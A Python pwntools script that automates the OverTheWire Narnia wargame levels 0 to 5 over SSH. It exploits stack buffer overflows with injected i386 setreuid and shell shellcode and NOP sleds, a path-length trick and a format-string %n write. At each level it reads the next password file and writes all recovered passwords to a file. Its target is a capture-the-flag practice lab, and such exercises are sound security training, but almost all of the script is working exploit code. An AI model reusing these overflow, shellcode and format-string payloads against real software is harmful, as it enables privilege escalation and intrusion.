#! /usr/bin/env python3
import pwn
import time
import os

def display():
    global flag, user
    print ("\n")
    print ("########################################################")
    print (" \t\t USER = "+user.decode("utf-8"))
    print (" \t\t FLAG = "+flag.decode("utf-8"))
    print ("########################################################")
    print ("\n")


def add_flag():
    global flag, i, user, nextuser
    i+=1
    user=b"narnia"+bytes(str(i),"ascii")
    nextuser=b"narnia"+bytes(str(i+1),"ascii")
    flag=flag[2:]
    f.write(user+b":\t"+flag)
    flag=flag[:-1]
    display()

def connexion():
    global flag, host, user, port 
    return pwn.ssh(user, host, password=flag, port=port)

def start():
    global s, p, ShellCode, i, user
    ShellCode = pwn.asm(
                pwn.shellcraft.i386.linux.setreuid(int('1400'+str(i+1))) + 
                pwn.shellcraft.i386.linux.sh()
    )
    s=connexion()

def end():
    global s, p, flag, user
    if user not in [b'narnia3']:
        flag=p.recvline()
    p.close()
    add_flag()
    s.close()

# set variables
f=open("flag.txt","wb")
i=-1
host='narnia.labs.overthewire.org'
user=b"narnia"+bytes(str(i),"ascii")
nextuser=b"narnia"+bytes(str(i+1),"ascii")
port=2226



# narnia0
flag=b"$ narnia0\n"
add_flag()

# narnia0 --> narnia1
start()
p = s.process(b'/narnia/'+user)
p.sendline(b"A"*pwn.cyclic_find(0x61616166)+pwn.p32(0xdeadbeef))
p.sendline(b"cat /etc/narnia_pass/"+nextuser)
p.recvuntil("val: 0xdeadbeef\n")
end()

# narnia1 --> narnia2
start()
NopeSled = b'\x90'*4096
p = s.process(b'/narnia/'+user,
              env={'EGG': pwn.p32(0xffffcb38-2048*250) + NopeSled + ShellCode  })
p.sendline(b"cat /etc/narnia_pass/"+nextuser)
p.recvuntil('Trying to execute EGG!\n')
end()

# narnia2 --> narnia3
start()
n=pwn.cyclic_find(0x6261616b)
arg=(b'\x90'*n+ShellCode)[-n:]+pwn.p32(0xffffddc0+20)
p = s.process([b'/narnia/'+user, arg])
p.sendline(b"cat /etc/narnia_pass/"+nextuser)
end()


# narnia3 --> narnia4
start()
filename='/tmp/ia4'
s.upload_data('',filename)
#s.system('rm '+filename)
p = s.process([b'/narnia/'+user, b'////////////etc/narnia_pass/'+nextuser],cwd='/tmp')
p.recvline()
flag=b'$ '+s.download_data(filename)[:11]
end()

# narnia4 --> narnia5
start()
n=pwn.cyclic_find(0x63616173)
arg=(b'\x90'*n+ShellCode)[-n:]+pwn.p32(0xffffd420+2401)
p = s.process([b'/narnia/'+user, arg])
p.sendline(b"cat /etc/narnia_pass/"+nextuser)
end()

# narnia5 --> narnia6
start()
n=63
x=pwn.p32(0xffffdc2c)
arg=(x+b'%496c'+b'%5$n'+b'A'*n)[:n]
p = s.process([b'/narnia/'+user, arg ])
p.sendline(b"cat /etc/narnia_pass/"+nextuser)
p.recvline()
end()


# end
f.close()
print ("\n")
print ("\t\t OverTheWire Narnia Passwords")
print ("\n")
os.system('cat flag.txt')
print ("\n")
